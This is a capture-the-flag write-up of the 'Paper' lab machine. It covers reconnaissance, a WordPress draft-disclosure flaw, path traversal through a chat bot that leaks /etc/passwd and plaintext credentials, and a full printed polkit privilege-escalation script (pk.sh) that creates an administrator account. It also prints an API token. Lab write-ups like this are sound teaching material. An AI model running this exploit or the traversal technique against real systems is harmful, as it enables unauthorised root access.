---
description: 'Date: 03/16/22'
---

# Paper (Easy)

IP: 10.129.103.175 Linux

NMAP SCAN: nmap -A -v -oA PaperTCP 10.129.103.175 --Ports--

1. SSH OpenSSH 8.0
2. 80 Apache 2.4.37
3. 443 Apache 2.4.37 DNS: localhost.localdomain

```
- From the Nmap report, we can assess that the primary attack surface stems from the web server (80/443).
```

Passive Reconaissance:

* Let's visit[http://10.129.103.175](http://10.129.103.175)
* It's an HTTP server test page running Apache 2.4.37
* Wappalyzer reports OpenSSL 1.1.1k | ??? mod\_fcgid/2.3.9
* CentOS in use
* Dirsearch Results: dirsearch -u[http://10.129.103.175](http://10.129.103.175)
  * 301 Perm Moved /.npm but get a 403 Forbidden when we navigate to it
  * 200 OK /.npm/anonymous-cli-metrics.json
    * In here we see the following in the Headers tab: Accept-Ranges bytes Content-Length 171 Content-Type application/json Date Sat, 05 Feb 2022 19:32:54 GMT ETag "ab-5c63455e67622" Last-Modified Sat, 03 Jul 2021 09:02:45 GMT Server Apache/2.4.37 (centos) OpenSSL/1.1.1k mod\_fcgid/2.3.9 X-Backend-Server office.paper Accept text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,_/_;q=0.8 Accept-Encoding gzip, deflate Accept-Language en-US,en;q=0.5 Cache-Control max-age=0 Connection keep-alive Host 10.129.103.175 If-Modified-Since Sat, 03 Jul 2021 09:02:45 GMT If-None-Match "ab-5c63455e67622" Upgrade-Insecure-Requests 1 User-Agent Mozilla/5.0 (X11; Linux x86\_64; rv:91.0) Gecko/20100101 Firefox/91.0
    * 403 Forbidden /php5.fcgi
* Dirbuster did not find anything interesting.
  * dirbuster -u[http://10.129.103.175/](http://10.129.103.175/) -w /home/kali/Desktop/Wordlists/SecLists/Discovery/Web-Content/common.txt
  * I used Common.txt
*
  * VHOST FOUND \*\*
* Upon investigating the weird .json file, I see office.paper for the backend server. This looks a lot like a vhost. Let's add it to /etc/hosts
* This worked. We can now see a wordpress server for a Blunder Tiffin Inc. Paper Company.
* Wappalyzer report:
  * WP 5.2.3
* While we visually inspect the newly found WP server, let's run a dirsearch on office.paper.
* Dirsearch Report: dirsearch -u[http://office.paper/](http://office.paper/) \[14:45:47] 403 - 199B - /.ht\_wsr.txt \[14:45:47] 403 - 199B - /.htaccess.save \[14:45:47] 403 - 199B - /.htaccess.sample \[14:45:47] 403 - 199B - /.htaccess.bak1 \[14:45:47] 403 - 199B - /.htaccess\_orig \[14:45:47] 403 - 199B - /.htaccess.orig \[14:45:47] 403 - 199B - /.htaccess\_extra \[14:45:47] 403 - 199B - /.htaccessBAK \[14:45:47] 403 - 199B - /.htaccess\_sc \[14:45:47] 403 - 199B - /.htm \[14:45:47] 403 - 199B - /.htaccessOLD \[14:45:47] 403 - 199B - /.htaccessOLD2 \[14:45:47] 403 - 199B - /.htpasswds \[14:45:47] 403 - 199B - /.html \[14:45:47] 403 - 199B - /.htpasswd\_test \[14:45:47] 403 - 199B - /.httr-oauth \[14:45:48] 403 - 199B - /.user.ini \[14:45:56] 403 - 199B - /cgi-bin/ \[14:46:01] 301 - 1B - /index.php ->[http://office.paper/](http://office.paper/) \[14:46:02] 200 - 19KB - /license.txt \[14:46:03] 301 - 235B - /manual ->[http://office.paper/manual/](http://office.paper/manual/) \[14:46:03] 200 - 9KB - /manual/index.html \[14:46:05] 403 - 199B - /php5.fcgi \[14:46:07] 200 - 7KB - /readme.html \[14:46:12] 301 - 237B - /wp-admin ->[http://office.paper/wp-admin/](http://office.paper/wp-admin/) \[14:46:12] 500 - 1B - /wp-config.php \[14:46:12] 301 - 239B - /wp-content ->[http://office.paper/wp-content/](http://office.paper/wp-content/) \[14:46:12] 200 - 0B - /wp-content/ \[14:46:12] 403 - 199B - /wp-content/uploads/ \[14:46:12] 403 - 199B - /wp-content/upgrade/ \[14:46:12] 403 - 199B - /wp-includes/ \[14:46:12] 500 - 0B - /wp-includes/rss-functions.php \[14:46:12] 301 - 240B - /wp-includes ->[http://office.paper/wp-includes/](http://office.paper/wp-includes/) \[14:46:12] 500 - 3KB - /wp-admin/setup-config.php \[14:46:13] 302 - 1B - /wp-admin/ ->[http://office.paper/wp-login.php?redirect\_to=http%3A%2F%2Foffice.paper%2Fwp-admin%2F\&reauth=1](http://office.paper/wp-login.php?redirect\_to=http%3A%2F%2Foffice.paper%2Fwp-admin%2F\&reauth=1) \[14:46:13] 200 - 1KB - /wp-admin/install.php \[14:46:13] 400 - 2B - /wp-admin/admin-ajax.php \[14:46:13] 200 - 3KB - /wp-login.php \[14:46:13] 302 - 1B - /wp-signup.php ->[http://office.paper/wp-login.php?action=register](http://office.paper/wp-login.php?action=register)

Content of office.paper:

*   "Feeling alone" Post: I am sorry everyone. I wanted to add every one of my friends to this blog, but Jan didn’t let me.

    So, other employees who were added to this blog are now removed.

    As of now there is only one user in this blog. Which is me! Just me.
*   Reply to post: nick June 20, 2021 at 2:49 pm

    Michael, you should remove the secret content from your drafts ASAP, as they are not that secure as you think! -Nick
* Possible Users:
  * nick/Nick
  * Prisonmike or Michael/michael
  * Creed Bratton
* [http://office.paper/?s=](http://office.paper/?s=)
  * This allows you to search all posts existing on the site.
  * I strongly believe that the foothold has to deal with Michael's usage of secret content within his drafts.
    * Let's run wpscan again.
    * However, I am unhappy with the output that it is producing. Let's try to get an API key from wpscan to boost our output.

Obtaining an API key from wpscan:

* Create a burner email with 10minutemail
* Google wpscan API
* Use the burner email and create/register an account on wpscan to obtain a personal API key.
* Make it easy to remember.
* Confirm your identity in the inbox of 10minutemail.
* Go back to wpscan and login to obtain your API key.
* 0dkeZIZvl3CrpKxGqbV81XYaeuqYxsgoj8BsShvEOWk

Now that we have an API key let's use it to boost our output produced by the wpscan tool:

* wpscan -h to understand my output
* wpscan --url[http://office.paper/](http://office.paper/) -e vp,vt --api-token 0dkeZIZvl3CrpKxGqbV81XYaeuqYxsgoj8BsShvEOWk

I found the following within the report:

* Wordpress 5.2.3 - Unauthenticated View Private/Draft Posts \*\* THIS SOUNDS A LOT LIKE SECRET CONTENT USAGE \*\*
* [https://wpscan.com/vulnerability/3413b879-785f-4c9f-aa8a-5a4a1d5e0ba2](https://wpscan.com/vulnerability/3413b879-785f-4c9f-aa8a-5a4a1d5e0ba2)
* PoC:[http://wordpress.local/?static=1\&order=asc](http://wordpress.local/?static=1\&order=asc)
* I placed this within the URL bar:[http://office.paper/?static=1\&order=](http://office.paper/?static=1\&order=)
* This vulnerability allows us to exploit Michael's usage of secret content in his drafts.

```
		test

		Micheal please remove the secret from drafts for gods sake!

		Hello employees of Blunder Tiffin,

		Due to the orders from higher officials, every employee who were added to this blog is removed and they are migrated to our new chat system.

		So, I kindly request you all to take your discussions from the public blog to a more private chat system.

		-Nick

		# Warning for Michael

		Michael, you have to stop putting secrets in the drafts. It is a huge security issue and you have to stop doing it. -Nick

		Threat Level Midnight

		A MOTION PICTURE SCREENPLAY,
		WRITTEN AND DIRECTED BY
		MICHAEL SCOTT

		[INT:DAY]

		Inside the FBI, Agent Michael Scarn sits with his feet up on his desk. His robotic butler Dwigt….

		# Secret Registration URL of new Employee chat system

		<http://chat.office.paper/register/8qozr226AhkCHZdyY>

		# I am keeping this draft unpublished, as unpublished drafts cannot be accessed by outsiders. I am not that ignorant, Nick.

		# Also, stop looking at my drafts. Jeez!
```

From what we found above, we found an additional vhost (chat.office.paper).

* Let's add it to /etc/hosts.
* Let's navigate to[http://chat.office.paper/register/8qozr226AhkCHZdyY](http://chat.office.paper/register/8qozr226AhkCHZdyY)
* We are able to register.
* We see everyone talking about the bot- recyclops
  * Let's DM him and see if we can talk about him.
  *   We see that he can list files and send files:

      * list ..
      * list..
      * list.. && -- don't inject OS commands!
      * list../user.txt
      * file ../user.txt -- Access Denied. This worked. I was able to attempt to grab the contents of user.txt.
      * file sale/portfolio.txt \<!=====Contents of file sale/portfolio.txt=====> Portfolio

      ***

      * Bill
      * Served the country in war
      * Family built the country
      * purchased paper worth a million dollars
      * will probably fire me. \<!=====End of file sale/portfolio.txt=====>
      * file sale\_2/portfolio.txt \<!=====Contents of file sale\_2/portfolio.txt=====> Portfolio

      ***

      * Christian
      * Still No idea how micheal made the sale!
      * Need further clarifications. \<!=====End of file sale\_2/portfolio.txt=====>
  *   file ../pk.sh \<!=====Contents of file ../pk.sh=====> #!/bin/bash

      ```
        # Set the name and display name
        userName="hacked"
        realName="hacked"

        # Set the account as an administrator
        accountType=1

        # Set the password hash for 'password' and password hint
        password='$5$WR3c6uwMGQZ/JEZw$OlBVzagNJswkWrKRSuoh/VCrZv183QpZL7sAeskcoTB'
        passHint="password"

        # Check Polkit version
        polkitVersion=$(systemctl status polkit.service | grep version | cut -d " " -f 9)
        if [[ "$(apt list --installed 2>/dev/null | grep polkit | grep -c 0.105-26)" -ge 1 || "$(yum list installed | grep polkit | grep -c 0.117-2)" ]]; then
        echo "[*] Vulnerable version of polkit found"
        else
        echo "[!] WARNING: Version of polkit might not vulnerable"
        fi

        # Validate user is running in SSH instead of desktop terminal
        if [[ -z $SSH_CLIENT || -z $SSH_TTY ]]; then
        echo "[!] WARNING: SSH into localhost first before running this script in order to avoid authentication prompts"
        exit
        fi

        # Test the dbus-send timing to load into exploit
        echo "[*] Determining dbus-send timing"
        realTime=$( TIMEFORMAT="%R"; { time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:$userName string:$realName int32:$accountType ; } 2>&1 | cut -d " " -f6 )
        halfTime=$(echo "scale=3;$realTime/2" | bc)

        # Check for user first in case previous run of script failed on password set
        if id "$userName" &>/dev/null; then
        userid=$(id -u $userName)
        echo "[*] New user $userName already exists with uid of $userid"
        else
        userid=""
        echo "[*] Attempting to create account"
        while [[ $userid == "" ]]
        do
        dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:$userName string:$realName int32:$accountType 2>/dev/null & sleep $halfTime ; kill $! 2>/dev/null
        if id "$userName" &>/dev/null; then
        userid=$(id -u $userName)
        echo "[*] New user $userName created with uid of $userid"
        fi
        done
        fi

        # Add the password to /etc/shadow
        # Sleep added to ensure there is enough of a delay between timestamp checks
        echo "[*] Adding password to /etc/shadow and enabling user"
        sleep 1
        currentTimestamp=$(stat -c %Z /etc/shadow)
        fileChanged="n"
        while [ $fileChanged == "n" ]
        do
        dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User$userid org.freedesktop.Accounts.User.SetPassword string:$password string:$passHint 2>/dev/null & sleep $halfTime ; kill $! 2>/dev/null
        if [ $(stat -c %Z /etc/shadow) -ne $currentTimestamp ];then
        fileChanged="y"
        echo "[*] Exploit complete!"
        fi
        done

        echo ""
        echo "[*] Run 'su - $userName', followed by 'sudo su' to gain root access"
        <!=====End of file ../pk.sh=====>
      ```

/etc/shadow!!!

* file ../../../etc/passwd \<!=====Contents of file ../../../etc/passwd=====> \<!=====End of file ../../../etc/passwd=====> root❌0:0:root:/root:/bin/bash bin❌1:1:bin:/bin:/sbin/nologin daemon❌2:2:daemon:/sbin:/sbin/nologin adm❌3:4:adm:/var/adm:/sbin/nologin lp❌4:7:lp:/var/spool/lpd:/sbin/nologin sync❌5:0:sync:/sbin:/bin/sync shutdown❌6:0:shutdown:/sbin:/sbin/shutdown halt❌7:0:halt:/sbin:/sbin/halt mail❌8:12:mail:/var/spool/mail:/sbin/nologin operator❌11:0:operator:/root:/sbin/nologin games❌12💯games:/usr/games:/sbin/nologin ftp❌14:50:FTP User:/var/ftp:/sbin/nologin nobody❌65534:65534:Kernel Overflow User:/:/sbin/nologin dbus❌81:81:System message bus:/:/sbin/nologin systemd-coredump❌999:997:systemd Core Dumper:/:/sbin/nologin systemd-resolve❌193:193:systemd Resolver:/:/sbin/nologin tss❌59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin polkitd❌998:996:User for polkitd:/:/sbin/nologin geoclue❌997:994:User for geoclue:/var/lib/geoclue:/sbin/nologin rtkit❌172:172:RealtimeKit:/proc:/sbin/nologin qemu❌107:107:qemu user:/:/sbin/nologin apache❌48:48:Apache:/usr/share/httpd:/sbin/nologin cockpit-ws❌996:993:User for cockpit-ws:/:/sbin/nologin pulse❌171:171:PulseAudio System Daemon:/var/run/pulse:/sbin/nologin usbmuxd❌113:113:usbmuxd user:/:/sbin/nologin unbound❌995:990:Unbound DNS resolver:/etc/unbound:/sbin/nologin rpc❌32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin gluster❌994:989:GlusterFS daemons:/run/gluster:/sbin/nologin chrony❌993:987::/var/lib/chrony:/sbin/nologin libstoragemgmt❌992:986:daemon account for libstoragemgmt:/var/run/lsm:/sbin/nologin saslauth❌991:76:Saslauthd user:/run/saslauthd:/sbin/nologin dnsmasq❌985:985:Dnsmasq DHCP and DNS server:/var/lib/dnsmasq:/sbin/nologin radvd❌75:75:radvd user:/:/sbin/nologin clevis❌984:983:Clevis Decryption Framework unprivileged user:/var/cache/clevis:/sbin/nologin pegasus❌66:65:tog-pegasus OpenPegasus WBEM/CIM services:/var/lib/Pegasus:/sbin/nologin sssd❌983:981:User for sssd:/:/sbin/nologin colord❌982:980:User for colord:/var/lib/colord:/sbin/nologin rpcuser❌29:29:RPC Service User:/var/lib/nfs:/sbin/nologin setroubleshoot❌981:979::/var/lib/setroubleshoot:/sbin/nologin pipewire❌980:978:PipeWire System Daemon:/var/run/pipewire:/sbin/nologin gdm❌42:42::/var/lib/gdm:/sbin/nologin gnome-initial-setup❌979:977::/run/gnome-initial-setup/:/sbin/nologin insights❌978:976:Red Hat Insights:/var/lib/insights:/sbin/nologin sshd❌74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin avahi❌70:70:Avahi mDNS/DNS-SD Stack:/var/run/avahi-daemon:/sbin/nologin tcpdump❌72:72::/:/sbin/nologin mysql❌27:27:MySQL Server:/var/lib/mysql:/sbin/nologin nginx❌977:975:Nginx web server:/var/lib/nginx:/sbin/nologin mongod❌976:974:mongod:/var/lib/mongo:/bin/false rocketchat❌1001:1001::/home/rocketchat:/bin/bash dwight❌1004:1004::/home/dwight:/bin/bash \<!=====End of file ../../../etc/passwd=====>

```
file ../.vim/.netrwhist
	<!=====Contents of file ../.vim/.netrwhist=====>
	<!=====End of file ../.vim/.netrwhist=====>
	let g:netrw_dirhistmax =10
	let g:netrw_dirhist_cnt =1
	let g:netrw_dirhist_1='/home/dwight/hubot/node_modules/@rocket.chat/sdk/dist/lib'
	<!=====End of file ../.vim/.netrwhist=====>

***file ../../dwight/hubot/.env*** --HARDCODED CREDENTIALS
	<!=====Contents of file ../../dwight/hubot/.env=====>
	export ROCKETCHAT_URL='<http://127.0.0.1:48320>'
	export ROCKETCHAT_USER=recyclops
	export ROCKETCHAT_PASSWORD=Queenofblad3s!23
	export ROCKETCHAT_USESSL=false
	export RESPOND_TO_DM=true
	export RESPOND_TO_EDITED=true
	export PORT=8000
	export BIND_ADDRESS=127.0.0.1
	<!=====End of file ../../dwight/hubot/.env=====>
```

Now we have credentials, let's try to SSH into the machine as Dwight.

* ssh [dwight@10.129.103.175](mailto:dwight@10.129.103.175)
* obtain user.txt flag:
* cat /home/dwight/user.txt

I obtained root using the script above. Please note that this was an unintended method and existed only for a day after the box was released.

* Execute [pk.sh](http://pk.sh/)
* bash [pk.sh](http://pk.sh/)
* su hacked
* password
* sudo su
* password
* You now have root.
* Obtain root flag:
* cat root/root.txt
